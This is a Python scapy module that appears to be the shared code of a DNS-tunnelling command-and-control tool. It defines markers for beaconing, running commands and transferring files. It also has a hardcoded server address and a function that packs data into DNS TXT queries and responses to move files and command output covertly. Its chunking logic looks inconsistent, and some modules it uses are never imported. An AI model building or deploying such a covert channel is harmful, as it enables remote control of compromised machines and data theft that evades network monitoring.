import os
from scapy.all import *
import signal
import subprocess
import threading
import base64

 
from scapy.all import *
import threading

FILE = b'filexx'           # module to send file
RUN = b'runxxx'            # module to run command
BEACON = b'beacon'          # client is ready to recieve command
BEGIN_OUTPUT = b'begino'    # server to open output_file
BEGIN_FILE = b'beginf'       # server to open file - name of the file in the data
IN_TRANSFER = b'transf'      # server to continue writing to the opened file
EF = b'eofeof'              # server to close the opened file

SERVER_ADR = "192.168.1.22"


LOG_OUTPUT = ".log_output.txt"
MTU_SIZE = 1500
HEADER_SIZE = 100

RUN_MODEL = "run"
SEND_MODEL = "send"


def signal_handler(sig, frame):
    print(' Exiting...')
    sys.exit(0)
    
def sniff_pkt(pfilter,handler,cnt=30,timer=1000):
    capture = sniff(filter=pfilter,count=cnt,prn=handler,timeout=timer)
    
def frag_and_send(packet,data,is_client,is_output,pref):
    for chunk in range(0, len(data), 10):
        x = chunk
        if is_output == 1:
            content = IN_TRANSFER
            content+=data[x:x+1400]
        elif is_output == 0:
            content = pref
            content+=data
        if is_client == 1:
            pkt = IP(dst=SERVER_ADR)/UDP(sport=1234)/DNS(qd=DNSQR(qtype="TXT", qname=content))
        elif is_client == 0:
            pkt = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNS(qd=packet[DNS].qd,rd=0,qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,type='TXT',rdata=content))
        send(pkt)
        time.sleep(300/1000)   
        
def close_file(fd):
    os.close(fd)
            
    
    
